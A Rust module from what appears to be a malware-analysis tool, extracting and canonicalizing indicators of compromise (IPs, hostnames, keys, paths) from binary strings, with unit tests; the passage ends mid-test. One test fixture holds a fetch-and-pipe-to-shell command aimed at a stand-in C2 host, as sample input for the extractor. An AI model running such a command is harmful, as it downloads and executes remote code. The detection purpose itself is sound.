//! Conservative, deduplicated indicator extraction.
//!
//! This module intentionally does not scan every dotted token as a hostname.
//! A context-free value such as `foo.rs` is indistinguishable from a Rust
//! filename, even though `.rs` is a real public suffix. Hostnames are emitted
//! only when an upstream extractor already typed the value as a hostname, when
//! it is the host portion of a structurally valid endpoint, or when it is an
//! authority in a URL. This trades recall for the precision required by bulk
//! corpus analysis.

use std::collections::HashMap;
use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};

use base64::Engine as _;
use serde::{Deserialize, Serialize};

use crate::{ExtractedString, StringKind, StringMethod};

/// Maximum detailed locations retained for one deduplicated IOC.
///
/// `count` continues to include later occurrences. Bounding the detail keeps a
/// repeated constant in a generated binary from growing output without bound.
pub const MAX_IOC_OCCURRENCES: usize = 8;

/// A canonical IOC namespace.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
#[non_exhaustive]
pub enum IocKind {
    /// An IPv4 or IPv6 address.
    Ip,
    /// A DNS hostname.
    Hostname,
    /// Canonical, lossless cryptographic key material.
    Key,
    /// An uncommon, absolute hardcoded filesystem path.
    Path,
}

/// Structural context for deciding whether a routable IP is version-like text.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum IpEvidence {
    /// An exact, otherwise unanchored IP string.
    Bare,
    /// A URL authority or an exact `IP:port` endpoint.
    Authority,
}

/// Whether an address is externally routable and useful as an IOC.
///
/// This is the shared implementation of Cleave's external-IPv4 policy,
/// extended to IPv6. It rejects non-routable/special ranges and, for bare
/// IPv4 strings, dotted versions. URL/endpoint structure relaxes only the
/// version heuristic; it never admits private or otherwise non-routable IPs.
#[must_use]
pub fn is_external_ip(ip: &IpAddr, evidence: IpEvidence) -> bool {
    match ip {
        IpAddr::V4(ip) => is_external_ipv4(ip, evidence),
        IpAddr::V6(ip) => is_external_ipv6(ip, evidence),
    }
}

fn is_external_ipv4(ip: &Ipv4Addr, evidence: IpEvidence) -> bool {
    let octets = ip.octets();

    // Zero octets are overwhelmingly versions/padding in static data. Cleave's
    // established IOC policy rejects them even inside a URL.
    if octets.contains(&0) {
        return false;
    }

    if octets[0] == 10
        || octets[0] == 127
        || (octets[0] == 100 && (64..=127).contains(&octets[1]))
        || (octets[0] == 169 && octets[1] == 254)
        || (octets[0] == 172 && (16..=31).contains(&octets[1]))
        || (octets[0] == 192 && octets[1] == 168)
        || (octets[0] == 192 && octets[1] == 0 && octets[2] == 2)
        || (octets[0] == 198 && (octets[1] == 18 || octets[1] == 19))
        || (octets[0] == 198 && octets[1] == 51 && octets[2] == 100)
        || (octets[0] == 203 && octets[1] == 0 && octets[2] == 113)
        || octets[0] >= 224
    {
        return false;
    }

    if evidence == IpEvidence::Bare {
        if octets[0] < 10 && octets[1] < 10 && octets[2] < 10 {
            return false;
        }
        if octets[2] == 1 && octets[3] == 1 {
            return false;
        }
    }
    true
}

fn is_external_ipv6(ip: &Ipv6Addr, evidence: IpEvidence) -> bool {
    if let Some(mapped) = ip.to_ipv4_mapped() {
        return is_external_ipv4(&mapped, evidence);
    }

    let segments = ip.segments();
    if ip.is_unspecified()
        || ip.is_loopback()
        || ip.is_multicast()
        || (segments[0] & 0xfe00) == 0xfc00 // unique-local fc00::/7
        || (segments[0] & 0xffc0) == 0xfe80 // link-local fe80::/10
        || (segments[0] & 0xffc0) == 0xfec0 // deprecated site-local fec0::/10
        || (segments[0] == 0x2001 && segments[1] == 0x0db8) // documentation
        || (segments[0] & 0xfff0) == 0x3ff0 // documentation 3fff::/20
        // NAT64 well-known prefix
        || (segments[0] == 0x0064 && segments[1] == 0xff9b)
    {
        return false;
    }

    // The remaining globally scoped allocations begin in 2000::/3.
    (segments[0] & 0xe000) == 0x2000
}

/// Algorithm context attached to structurally proven key material.
///
/// The algorithm is metadata rather than identity: the same byte sequence
/// reused as (for example) an XOR and RC4 key should pivot to the same IOC.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
#[non_exhaustive]
pub enum KeyAlgorithm {
    Xor,
    Des,
    TripleDes,
    Fernet,
    Aes,
    Rc4,
    ChaCha20,
}

/// Metadata for a key IOC. Exact bytes live in the IOC's canonical `value`.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct KeyMetadata {
    /// Sorted unique algorithms for which this material was observed.
    pub algorithms: Vec<KeyAlgorithm>,
    /// Length of the decoded key material in bytes.
    pub bytes: u32,
}

/// One source occurrence of a deduplicated IOC.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct IocOccurrence {
    /// Source byte spans as `[offset, length]`. Most values have one span;
    /// stack-constructed strings may have several.
    pub source_spans: Vec<[u64; 2]>,
    /// Byte span `[offset, length]` of the IOC within the extracted/decoded
    /// string value. This is deliberately separate from `source_spans`: a host
    /// inside base64 text cannot be mapped honestly onto a subset of the
    /// encoded source bytes.
    pub value_span: [u32; 2],
    /// Port attached at this occurrence, if any. Ports annotate observations;
    /// they are not part of IOC identity.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub port: Option<u16>,
    /// Extraction/decoding method that produced the containing string.
    pub method: StringMethod,
}

/// A canonical IOC with bounded occurrence evidence.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Ioc {
    pub kind: IocKind,
    /// Canonical address/hostname/path, or `base64url:<material>` for `Key`.
    pub value: String,
    /// Sorted unique ports observed with this address/hostname.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub ports: Vec<u16>,
    /// Present only for [`IocKind::Key`].
    #[serde(skip_serializing_if = "Option::is_none")]
    pub key: Option<KeyMetadata>,
    /// Total number of observations before the occurrence-detail cap.
    pub count: u32,
    /// First [`MAX_IOC_OCCURRENCES`] observations.
    pub occurrences: Vec<IocOccurrence>,
}

#[derive(Debug)]
struct NetworkMatch {
    kind: IocKind,
    value: String,
    port: Option<u16>,
    start: usize,
    len: usize,
}

/// Canonicalize a syntactically valid hostname with a known public suffix.
///
/// ASCII input stays on a small fast path. Unicode input is converted with
/// UTS 46/IDNA first. A valid DNS-looking token with an unknown suffix is not
/// accepted here; callers with stronger non-public DNS context should model
/// that context explicitly instead of weakening this corpus-wide predicate.
#[must_use]
pub fn canonicalize_hostname(input: &str) -> Option<String> {
    let input = input.strip_suffix('.').unwrap_or(input);
    if input.is_empty() || input.len() > 253 {
        return None;
    }

    let ascii = if input.is_ascii() {
        input.to_ascii_lowercase()
    } else {
        idna::domain_to_ascii_strict(input)
            .ok()?
            .to_ascii_lowercase()
    };

    if ascii.is_empty() || ascii.len() > 253 || !ascii.contains('.') {
        return None;
    }
    for label in ascii.split('.') {
        if label.is_empty()
            || label.len() > 63
            || label.starts_with('-')
            || label.ends_with('-')
            || !label
                .bytes()
                .all(|b| b.is_ascii_alphanumeric() || b == b'-')
        {
            return None;
        }
    }

    // Tor v3 services are special-use hostnames rather than PSL entries.
    if let Some(service) = ascii.strip_suffix(".onion") {
        let label = service.rsplit('.').next()?;
        if label.len() == 56
            && label
                .bytes()
                .all(|b| b.is_ascii_lowercase() || (b'2'..=b'7').contains(&b))
        {
            return Some(ascii);
        }
        return None;
    }

    let suffix = psl::suffix(ascii.as_bytes())?;
    if !suffix.is_known() || psl::domain(ascii.as_bytes()).is_none() {
        return None;
    }
    Some(ascii)
}

/// Extract canonical, deduplicated IOCs from already-extracted strings.
///
/// This pass is intentionally cheap for ordinary strings: unless the upstream
/// kind is network-relevant or the value contains `://`, it performs only the
/// endpoint delimiter check. No file bytes are rescanned.
#[must_use]
pub fn extract_iocs(strings: &[ExtractedString]) -> Vec<Ioc> {
    let mut out: Vec<Ioc> = Vec::new();
    let mut by_identity: HashMap<(IocKind, String), usize> = HashMap::new();

    for extracted in strings {
        let value = extracted.value.as_str();

        // Certificate/code-signature strings contain validation and policy
        // URLs that identify the signer ecosystem, not behavior of the sample.
        if extracted.method == StringMethod::CodeSignature {
            continue;
        }

        // Key IOCs require an upstream structural detector. Never infer a key
        // from entropy or length here: ordinary constants would swamp a large
        // corpus with false positives.
        if extracted.kind == Some(StringKind::XorKey) {
            if let Some(material) = xor_key_material(extracted) {
                record_key(
                    &mut out,
                    &mut by_identity,
                    extracted,
                    &material,
                    KeyAlgorithm::Xor,
                );
            }
            continue;
        }

        if matches!(
            extracted.kind,
            Some(StringKind::Path | StringKind::SuspiciousPath)
        ) {
            if extracted.method != StringMethod::PclntabSymbol
                && let Some(path) = canonicalize_ioc_path(value)
            {
                record_match(
                    &mut out,
                    &mut by_identity,
                    extracted,
                    NetworkMatch {
                        kind: IocKind::Path,
                        len: value.len(),
                        value: path,
                        port: None,
                        start: 0,
                    },
                );
            }
            continue;
        }

        // URL authorities are strong structural evidence even when a broader
        // classifier called the whole string a shell command or source code.
        scan_url_authorities(value, |m| {
            let external_ip = m.kind != IocKind::Ip
                || m.value
                    .parse::<IpAddr>()
                    .is_ok_and(|ip| is_external_ip(&ip, IpEvidence::Authority));
            if external_ip
                && (m.kind != IocKind::Hostname
                    || !should_suppress_metadata_hostname(extracted.method, &m.value))
            {
                record_match(&mut out, &mut by_identity, extracted, m);
            }
        });

        let typed_host = extracted.kind == Some(StringKind::Hostname);
        let typed_ip = matches!(extracted.kind, Some(StringKind::IP | StringKind::IPPort));

        // Avoid hostname/PSL parsing for the overwhelmingly common ordinary
        // string. An exact host:port is structural evidence on its own. A bare
        // hostname or IP is accepted only when the upstream extractor typed it.
        if (typed_host || typed_ip || has_endpoint_shape(value))
            && let Some(m) = parse_exact_network(value, typed_host, typed_ip)
            && !(m.kind == IocKind::Hostname
                && should_suppress_metadata_hostname(extracted.method, &m.value))
            && (m.kind != IocKind::Ip
                || m.value.parse::<IpAddr>().is_ok_and(|ip| {
                    let evidence = if m.port.is_some() {
                        IpEvidence::Authority
                    } else {
                        IpEvidence::Bare
                    };
                    is_external_ip(&ip, evidence)
                }))
        {
            record_match(&mut out, &mut by_identity, extracted, m);
        }
    }

    for ioc in &mut out {
        ioc.ports.sort_unstable();
        ioc.ports.dedup();
        if let Some(key) = &mut ioc.key {
            key.algorithms.sort_unstable();
            key.algorithms.dedup();
        }
    }
    out.sort_by(|a, b| (a.kind, a.value.as_str()).cmp(&(b.kind, b.value.as_str())));
    out
}

fn record_match(
    out: &mut Vec<Ioc>,
    by_identity: &mut HashMap<(IocKind, String), usize>,
    extracted: &ExtractedString,
    matched: NetworkMatch,
) {
    let identity = (matched.kind, matched.value.clone());
    let idx = if let Some(idx) = by_identity.get(&identity) {
        *idx
    } else {
        let idx = out.len();
        by_identity.insert(identity, idx);
        out.push(Ioc {
            kind: matched.kind,
            value: matched.value,
            ports: Vec::new(),
            key: None,
            count: 0,
            occurrences: Vec::new(),
        });
        idx
    };

    let ioc = &mut out[idx];
    ioc.count = ioc.count.saturating_add(1);
    if let Some(port) = matched.port
        && !ioc.ports.contains(&port)
    {
        ioc.ports.push(port);
    }
    if ioc.occurrences.len() >= MAX_IOC_OCCURRENCES {
        return;
    }

    let source_spans = extracted
        .source_spans()
        .map(|(offset, len)| [offset, len])
        .collect();
    ioc.occurrences.push(IocOccurrence {
        source_spans,
        value_span: [
            u32::try_from(matched.start).unwrap_or(u32::MAX),
            u32::try_from(matched.len).unwrap_or(u32::MAX),
        ],
        port: matched.port,
        method: extracted.method,
    });
}

fn record_key(
    out: &mut Vec<Ioc>,
    by_identity: &mut HashMap<(IocKind, String), usize>,
    extracted: &ExtractedString,
    material: &[u8],
    algorithm: KeyAlgorithm,
) {
    let value = encode_key_material(material);
    let identity = (IocKind::Key, value.clone());
    let idx = if let Some(idx) = by_identity.get(&identity) {
        *idx
    } else {
        let idx = out.len();
        by_identity.insert(identity, idx);
        out.push(Ioc {
            kind: IocKind::Key,
            value,
            ports: Vec::new(),
            key: Some(KeyMetadata {
                algorithms: Vec::new(),
                bytes: u32::try_from(material.len()).unwrap_or(u32::MAX),
            }),
            count: 0,
            occurrences: Vec::new(),
        });
        idx
    };

    let ioc = &mut out[idx];
    ioc.count = ioc.count.saturating_add(1);
    if let Some(key) = &mut ioc.key
        && !key.algorithms.contains(&algorithm)
    {
        key.algorithms.push(algorithm);
    }
    if ioc.occurrences.len() >= MAX_IOC_OCCURRENCES {
        return;
    }
    ioc.occurrences.push(IocOccurrence {
        source_spans: extracted
            .source_spans()
            .map(|(offset, len)| [offset, len])
            .collect(),
        value_span: [0, u32::try_from(extracted.value.len()).unwrap_or(u32::MAX)],
        port: None,
        method: extracted.method,
    });
}

/// Return the stable, lossless IOC identity for decoded key bytes.
///
/// Unpadded base64url represents arbitrary bytes without JSON escaping. The
/// prefix makes the encoding explicit and leaves room for future wire formats.
/// Hopper should decode and store the exact bytes; Bloom filters may hash them
/// internally, but every reported match must be confirmed against these bytes.
#[must_use]
pub fn encode_key_material(material: &[u8]) -> String {
    let encoded = base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(material);
    format!("base64url:{encoded}")
}

/// Decode a canonical key IOC value back to its exact bytes.
///
/// Non-canonical aliases (padding, non-zero trailing bits, or the wrong
/// alphabet/prefix) are rejected so all producers share one identity.
#[must_use]
pub fn decode_key_material(value: &str) -> Option<Vec<u8>> {
    let encoded = value.strip_prefix("base64url:")?;
    if encoded.is_empty() {
        return None;
    }
    let material = base64::engine::general_purpose::URL_SAFE_NO_PAD
        .decode(encoded)
        .ok()?;
    (encode_key_material(&material) == value).then_some(material)
}

/// Canonicalize an uncommon absolute path suitable for exact IOC matching.
///
/// This intentionally performs minimal normalization: only a Windows drive
/// letter is uppercased. Resolving `..`, separators, case, symlinks, or
/// environment variables without the target filesystem would merge distinct
/// paths and create false matches.
#[must_use]
pub fn canonicalize_ioc_path(input: &str) -> Option<String> {
    if input.is_empty()
        || input.len() > 4096
        || input.trim() != input
        || input.bytes().any(|b| b.is_ascii_control())
        || has_path_template(input)
        || input.contains("://")
    {
        return None;
    }

    let bytes = input.as_bytes();
    let windows_drive = bytes.len() >= 3
        && bytes[0].is_ascii_alphabetic()
        && bytes[1] == b':'
        && matches!(bytes[2], b'\\' | b'/');
    let windows_unc = input.starts_with(r"\\")
        && input[2..]
            .split(['\\', '/'])
            .filter(|part| !part.is_empty())
            .count()
            >= 3;
    let posix = input.starts_with('/') && !input.starts_with("//");
    if !posix && !windows_drive && !windows_unc {
        return None;
    }
    if posix && memchr::memchr_iter(b'/', bytes).count() < 2 {
        return None;
    }

    if input.ends_with(['/', '\\']) {
        return None;
    }
    let leaf = input.rsplit(['/', '\\']).next()?;
    if leaf.len() < 5
        || matches!(leaf, "." | "..")
        || looks_like_source_file(leaf)
        || looks_like_build_source_path(input, leaf)
    {
        return None;
    }

    if !posix {
        if input[usize::from(windows_drive) * 2..]
            .bytes()
            .any(|b| matches!(b, b'<' | b'>' | b'"' | b'|' | b'?' | b'*' | b':'))
        {
            return None;
        }
    } else if !input
        .chars()
        .all(|c| c.is_alphanumeric() || matches!(c, '/' | '.' | '_' | '-' | '+' | '@' | ' '))
    {
        return None;
    }

    let comparison = if posix {
        input.to_string()
    } else {
        input.to_ascii_lowercase()
    };
    if is_common_system_path(&comparison) {
        return None;
    }

    let mut canonical = input.to_string();
    if windows_drive {
        canonical.replace_range(0..1, &input[..1].to_ascii_uppercase());
    }
    Some(canonical)
}

fn has_path_template(path: &str) -> bool {
    if path.contains('$') || path.contains('{') || path.contains('}') {
        return true;
    }
    path.as_bytes().windows(2).any(|pair| {
        pair[0] == b'%'
            && matches!(
                pair[1],
                b's' | b'S' | b'd' | b'i' | b'u' | b'x' | b'X' | b'f' | b'@' | b'0'..=b'9'
            )
    })
}

fn looks_like_source_file(leaf: &str) -> bool {
    let leaf = leaf.to_ascii_lowercase();
    [
        ".c", ".cc", ".cpp", ".cxx", ".go", ".h", ".hh", ".hpp", ".java", ".m", ".mm", ".rs",
        ".swift",
    ]
    .iter()
    .any(|extension| leaf.ends_with(extension))
}

fn looks_like_build_source_path(path: &str, leaf: &str) -> bool {
    let normalized = path.replace('\\', "/").to_ascii_lowercase();
    let in_source_tree = normalized.contains("/src/")
        || normalized.contains("/include/")
        || normalized.contains("/node_modules/")
        || normalized.contains("/vendor/")
        || normalized.contains("/go/pkg/mod/")
        || normalized.contains("/rustc/");
    if !in_source_tree {
        return false;
    }
    let leaf = leaf.to_ascii_lowercase();
    [
        ".c", ".cc", ".cpp", ".cxx", ".go", ".h", ".hh", ".hpp", ".java", ".js", ".m", ".mm",
        ".py", ".rs", ".swift", ".ts",
    ]
    .iter()
    .any(|extension| leaf.ends_with(extension))
}

fn is_common_system_path(path: &str) -> bool {
    const POSIX: &[&str] = &[
        "/bin/bash",
        "/bin/cat",
        "/bin/dash",
        "/bin/echo",
        "/bin/false",
        "/bin/ls",
        "/bin/sh",
        "/bin/true",
        "/bin/zsh",
        "/dev/egd-pool",
        "/dev/null",
        "/dev/random",
        "/dev/srandom",
        "/dev/stderr",
        "/dev/stdin",
        "/dev/stdout",
        "/dev/tty",
        "/dev/ubskey",
        "/dev/urandom",
        "/etc/egd-pool",
        "/etc/entropy",
        "/etc/apache/mime.types",
        "/etc/apache2/mime.types",
        "/etc/group",
        "/etc/hosts",
        "/etc/httpd/conf/mime.types",
        "/etc/mdns.allow",
        "/etc/mime.types",
        "/etc/nsswitch.conf",
        "/etc/passwd",
        "/etc/pki/tls/certs/ca-bundle.crt",
        "/etc/pki/ca-trust/extracted/pem/tls-ca-bundle.pem",
        "/etc/pki/tls/cacert.pem",
        "/etc/pki/tls/certs",
        "/etc/protocols",
        "/etc/resolv.conf",
        "/etc/services",
        "/etc/ssl/ca-bundle.pem",
        "/etc/ssl/cert.pem",
        "/etc/ssl/certs",
        "/etc/ssl/certs/ca-certificates.crt",
        "/etc/zoneinfo",
        "/lib/time/zoneinfo.zip",
        "/lib64/ld-linux-x86-64.so.2",
        "/proc/meminfo",
        "/proc/self/auxv",
        "/proc/sys/kernel/hostname",
        "/proc/sys/net/core/somaxconn",
        "/system/etc/security/cacerts",
        "/usr/bin/bash",
        "/usr/bin/curl",
        "/usr/bin/env",
        "/usr/bin/false",
        "/usr/bin/perl",
        "/usr/bin/python",
        "/usr/bin/python3",
        "/usr/bin/ruby",
        "/usr/bin/sh",
        "/usr/bin/true",
        "/usr/bin/wget",
        "/usr/bin/zsh",
        "/usr/bin/ntlm_auth",
        "/usr/lib/dyld",
        "/usr/local/share/mime/globs2",
        "/usr/share/mime/globs2",
        "/var/run/egd-pool",
    ];
    const WINDOWS_LOWERCASE: &[&str] = &[
        r"c:\windows\explorer.exe",
        r"c:\windows\notepad.exe",
        r"c:\windows\system32\cmd.exe",
        r"c:\windows\system32\powershell.exe",
        r"c:\windows\system32\rundll32.exe",
    ];
    POSIX.contains(&path)
        || WINDOWS_LOWERCASE.contains(&path)
        || path.eq_ignore_ascii_case("/drivers/etc/hosts")
        || path.starts_with("/dev/")
        || path.starts_with("/root/go/")
        || path.starts_with("/System/Library/Frameworks/")
        || path.starts_with("/root/openssl-prefix/")
        || path.starts_with("/sys/kernel/mm/")
        || path.contains("/.cargo/registry/src/")
        || path.contains("/lib/rustlib/src/")
        || (path.starts_with("/usr/lib/") && path.rsplit('/').next().is_some_and(is_system_library))
}

fn is_system_library(leaf: &str) -> bool {
    (leaf.starts_with("lib") && (leaf.contains(".so") || leaf.ends_with(".dylib")))
        || leaf == "dyld"
}

fn is_common_metadata_hostname(hostname: &str) -> bool {
    if matches!(
        hostname,
        "curl.haxx.se"
            | "ns.adobe.com"
            | "schemas.microsoft.com"
            | "schemas.openxmlformats.org"
            | "www.apple.com"
            | "crl.microsoft.com"
            | "github.com"
            | "go.dev"
            | "www.microsoft.com"
            | "www.openssl.org"
            | "www.w3.org"
    ) {
        return true;
    }

    let mut labels = hostname.rsplit('.');
    matches!(
        (labels.next(), labels.next()),
        (
            Some("com"),
            Some("digicert" | "symcb" | "symauth" | "verisign")
        )
    )
}

fn should_suppress_metadata_hostname(method: StringMethod, hostname: &str) -> bool {
    // Compiler, runtime, and certificate metadata is surfaced by these direct
    // extraction paths. Decoded/stack-constructed values are much stronger
    // behavioral evidence and keep the overwhelmingly common IOC hot path
    // free of a metadata deny-list lookup.
    matches!(
        method,
        StringMethod::RawScan
            | StringMethod::Heuristic
            | StringMethod::InstructionPattern
            | StringMethod::Structure
            | StringMethod::R2String
            | StringMethod::WideString
    ) && is_common_metadata_hostname(hostname)
}

fn xor_key_material(extracted: &ExtractedString) -> Option<Vec<u8>> {
    if extracted.value.is_empty() || extracted.value.len() > 4096 {
        return None;
    }

    // ARM64 stack-XOR recovery renders arbitrary key bytes as `0x<hex>`.
    // Restrict hex decoding to that producer: a user-supplied ASCII XOR key
    // beginning with "0x" must remain those literal bytes.
    if extracted.method == StringMethod::XorStackPair {
        let encoded = extracted.value.strip_prefix("0x")?;
        if encoded.is_empty() || encoded.len() % 2 != 0 {
            return None;
        }
        return hex::decode(encoded).ok().filter(|key| !key.is_empty());
    }

    Some(extracted.value.as_bytes().to_vec())
}

fn parse_exact_network(value: &str, typed_host: bool, typed_ip: bool) -> Option<NetworkMatch> {
    let trimmed = value.trim();
    let start = value.len().checked_sub(value.trim_start().len())?;
    if trimmed.is_empty() || trimmed.contains("://") {
        return None;
    }

    if let Some((kind, canonical, port, host_len)) = parse_authority(trimmed) {
        let is_endpoint = port.is_some();
        if is_endpoint
            || (kind == IocKind::Ip && typed_ip)
            || (kind == IocKind::Hostname && typed_host)
        {
            return Some(NetworkMatch {
                kind,
                value: canonical,
                port,
                start,
                len: host_len,
            });
        }
    }
    None
}

/// Parse a URL authority or an exact network token.
///
/// Returns `(kind, canonical host, port, host length in the input)`.
fn parse_authority(authority: &str) -> Option<(IocKind, String, Option<u16>, usize)> {
    let authority = authority
        .rsplit_once('@')
        .map_or(authority, |(_, host)| host);
    if authority.is_empty() {
        return None;
    }

    if let Some(rest) = authority.strip_prefix('[') {
        let close = rest.find(']')?;
        let host = &rest[..close];
        let ip: IpAddr = host.parse().ok()?;
        if !ip.is_ipv6() {
            return None;
        }
        let tail = &rest[close + 1..];
        let port = if tail.is_empty() {
            None
        } else {
            Some(parse_port(tail.strip_prefix(':')?)?)
        };
        return Some((IocKind::Ip, ip.to_string(), port, host.len()));
    }

    if let Ok(ip) = authority.parse::<IpAddr>() {
        return Some((IocKind::Ip, ip.to_string(), None, authority.len()));
    }

    let (host, port) = match authority.rsplit_once(':') {
        Some((host, port)) if !host.contains(':') => (host, Some(parse_port(port)?)),
        _ => (authority, None),
    };
    if let Ok(ip) = host.parse::<IpAddr>() {
        return Some((IocKind::Ip, ip.to_string(), port, host.len()));
    }
    let hostname = canonicalize_hostname(host)?;
    Some((IocKind::Hostname, hostname, port, host.len()))
}

fn parse_port(port: &str) -> Option<u16> {
    let parsed = port.parse::<u16>().ok()?;
    (parsed != 0).then_some(parsed)
}

/// Cheap necessary-condition gate before parsing an untyped endpoint.
///
/// This deliberately does not prove validity; `parse_authority` still performs
/// exact IP/hostname/port validation. Its job is to keep PSL and IDNA work out
/// of the ordinary-string path.
fn has_endpoint_shape(value: &str) -> bool {
    let value = value.trim();
    let Some((host, port)) = value.rsplit_once(':') else {
        return false;
    };
    !host.is_empty()
        && !port.is_empty()
        && port.bytes().all(|b| b.is_ascii_digit())
        && (value.starts_with('[') || !host.contains(':'))
}

fn scan_url_authorities(value: &str, mut emit: impl FnMut(NetworkMatch)) {
    let bytes = value.as_bytes();
    if memchr::memchr(b':', bytes).is_none() {
        return;
    }
    let mut search_from = 0usize;
    while search_from < bytes.len() {
        let Some(rel) = memchr::memmem::find(&bytes[search_from..], b"://") else {
            break;
        };
        let marker = search_from + rel;
        let Some(_scheme_start) = scheme_start(bytes, marker) else {
            search_from = marker + 3;
            continue;
        };
        let authority_start = marker + 3;
        let authority_end = bytes[authority_start..]
            .iter()
            .position(|b| {
                b.is_ascii_whitespace()
                    || matches!(*b, b'/' | b'?' | b'#' | b'"' | b'\'' | b'<' | b'>')
            })
            .map_or(bytes.len(), |end| authority_start + end);
        let authority = &value[authority_start..authority_end];
        if let Some((kind, canonical, port, host_len)) = parse_authority(authority) {
            let userinfo_len = authority.rfind('@').map_or(0, |at| at.saturating_add(1));
            let bracket_len = usize::from(authority[userinfo_len..].starts_with('['));
            emit(NetworkMatch {
                kind,
                value: canonical,
                port,
                start: authority_start + userinfo_len + bracket_len,
                len: host_len,
            });
        }
        search_from = authority_end.max(marker + 3);
    }
}

fn scheme_start(bytes: &[u8], colon: usize) -> Option<usize> {
    if colon == 0 {
        return None;
    }
    let mut start = colon;
    while start > 0 {
        let b = bytes[start - 1];
        if b.is_ascii_alphanumeric() || matches!(b, b'+' | b'-' | b'.') {
            start -= 1;
        } else {
            break;
        }
    }
    let scheme = &bytes[start..colon];
    (!scheme.is_empty()
        && scheme[0].is_ascii_alphabetic()
        && scheme
            .iter()
            .all(|b| b.is_ascii_alphanumeric() || matches!(*b, b'+' | b'-' | b'.')))
    .then_some(start)
}

#[cfg(test)]
#[allow(clippy::unwrap_used)]
mod tests {
    use super::*;

    fn string(value: &str, kind: Option<StringKind>, method: StringMethod) -> ExtractedString {
        ExtractedString {
            value: value.to_string(),
            data_offset: 100,
            data_len: u32::try_from(value.len()).unwrap(),
            method,
            kind,
            fragments: None,
        }
    }

    #[test]
    fn hostname_canonicalization_requires_real_structure_and_suffix() {
        assert_eq!(
            canonicalize_hostname("C2.Example.CO.UK."),
            Some("c2.example.co.uk".to_string())
        );
        assert_eq!(
            canonicalize_hostname("BÜCHER.example"),
            None,
            ".example is reserved, not a known public suffix"
        );
        assert_eq!(canonicalize_hostname("-bad.example.com"), None);
        assert_eq!(canonicalize_hostname("bad_.example.com"), None);
        assert_eq!(canonicalize_hostname("example.unknownsuffix"), None);
        assert_eq!(canonicalize_hostname("com"), None);
    }

    #[test]
    fn exact_untyped_bare_hostname_is_not_emitted() {
        let values = [
            string("foo.rs", None, StringMethod::RawScan),
            string("1.2.3.4", None, StringMethod::RawScan),
            string("ordinary text", None, StringMethod::RawScan),
        ];
        assert!(extract_iocs(&values).is_empty());
    }

    #[test]
    fn exact_typed_hostname_is_canonicalized() {
        let values = [string(
            "C2.Example.COM.",
            Some(StringKind::Hostname),
            StringMethod::XorDecode,
        )];
        let got = extract_iocs(&values);
        assert_eq!(got.len(), 1);
        assert_eq!(got[0].kind, IocKind::Hostname);
        assert_eq!(got[0].value, "c2.example.com");
    }

    #[test]
    fn endpoint_is_structural_and_port_is_metadata() {
        let values = [
            string("c2.example.com:443", None, StringMethod::RawScan),
            string("C2.EXAMPLE.COM:8443", None, StringMethod::Base64Decode),
        ];
        let got = extract_iocs(&values);
        assert_eq!(got.len(), 1);
        assert_eq!(got[0].value, "c2.example.com");
        assert_eq!(got[0].ports, vec![443, 8443]);
        assert_eq!(got[0].count, 2);
    }

    #[test]
    fn url_authorities_are_extracted_inside_larger_strings() {
        let values = [string(
            "curl https://user:pass@C2.Example.COM:443/a | sh",
            Some(StringKind::ShellCmd),
            StringMethod::Base64Decode,
        )];
        let got = extract_iocs(&values);
        assert_eq!(got.len(), 1);
        assert_eq!(got[0].value, "c2.example.com");
        assert_eq!(got[0].ports, vec![443]);
        assert_eq!(got[0].occurrences[0].method, StringMethod::Base64Decode);
        assert_eq!(
            &values[0].value[got[0].occurrences[0].value_span[0] as usize
                ..(got[0].occurrences[0].value_span[0] + got[0].occurrences[0].value_span[1])
                    as usize],
            "C2.Example.COM"
        );
    }

    #[test]
    fn ipv6_endpoint_is_canonical_and_deduplicated_with_plain_ip() {
        let values = [
            string(
                "[2606:4700:4700:0:0:0:0:1111]:443",
                Some(StringKind::IPPort),
                StringMethod::RawScan,
            ),
            string(
                "2606:4700:4700::1111",
                Some(StringKind::IP),
                StringMethod::RawScan,
            ),
        ];
        let got = extract_iocs(&values);
        assert_eq!(got.len(), 1);
        assert_eq!(got[0].value, "2606:4700:4700::1111");
        assert_eq!(got[0].ports, vec![443]);
        assert_eq!(got[0].count, 2);
    }

    #[test]
    fn external_ip_policy_rejects_versions_and_non_routable_ranges() {
        for accepted in [
            "45.33.32.156",
            "104.16.132.229",
            "3.147.61.167",
            "2.27.62.51",
            "208.67.222.222",
            "2606:4700:4700::1111",
        ] {
            let ip = accepted.parse().expect("valid test IP");
            assert!(
                is_external_ip(&ip, IpEvidence::Bare),
                "rejected external IP: {accepted}"
            );
        }

        for rejected in [
            "1.2.0.4",
            "8.8.8.8",
            "10.1.2.3",
            "100.64.1.1",
            "127.1.2.3",
            "169.254.1.1",
            "172.16.1.1",
            "192.168.1.1",
            "192.0.2.1",
            "198.19.1.1",
            "198.51.100.1",
            "203.0.113.1",
            "224.1.2.3",
            "240.1.2.3",
            "::1",
            "fc00::1",
            "fe80::1",
            "2001:db8::1",
            "3fff::1",
        ] {
            let ip = rejected.parse().expect("valid test IP");
            assert!(
                !is_external_ip(&ip, IpEvidence::Bare),
                "accepted non-IOC IP: {rejected}"
            );
        }

        let structural_dns = "1.1.1.1".parse().expect("valid test IP");
        assert!(!is_external_ip(&structural_dns, IpEvidence::Bare));
        assert!(is_external_ip(&structural_dns, IpEvidence::Authority));

        let private = "192.168.1.1".parse().expect("valid test IP");
        assert!(!is_external_ip(&private, IpEvidence::Authority));
    }

    #[test]
    fn malformed_endpoints_and_url_lookalikes_are_rejected() {
        let values = [
            string("foo.rs:0", None, StringMethod::RawScan),
            string("foo.rs:65536", None, StringMethod::RawScan),
            string(
                "1.2.3.4:abc",
                Some(StringKind::IPPort),
                StringMethod::RawScan,
            ),
            string("1.2.0.4", Some(StringKind::IP), StringMethod::RawScan),
            string(
                "http://192.168.1.1/admin",
                Some(StringKind::Url),
                StringMethod::RawScan,
            ),
